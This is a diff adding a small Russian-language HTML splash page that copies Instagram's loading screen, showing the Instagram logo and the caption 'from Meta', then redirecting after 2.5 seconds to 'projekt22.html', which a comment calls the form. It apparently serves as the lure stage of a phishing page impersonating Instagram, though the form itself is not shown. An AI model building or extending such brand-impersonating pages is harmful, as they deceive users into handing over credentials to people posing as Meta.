@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Loading</title>
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: white;
+}
+
+#loader {
+    text-align: center;
+    animation: fadeOut 1s ease forwards;
+    animation-delay: 2s;
+}
+
+.logo {
+    width: 90px;
+    animation: zoom 1.5s ease;
+}
+
+.meta {
+    margin-top: 20px;
+    color: #999;
+}
+
+@keyframes zoom {
+    from {opacity:0; transform:scale(0.5);}
+    to {opacity:1; transform:scale(1);}
+}
+
+@keyframes fadeOut {
+    to {opacity:0;}
+}
+</style>
+</head>
+
+<body>
+
+<div id="loader">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo">
+    <div class="meta">from Meta</div>
+</div>
+
+<script>
+setTimeout(() => {
+    window.location.href = "projekt22.html"; // Переход на форму
+}, 2500);
+</script>
+
+</body>
+</html>
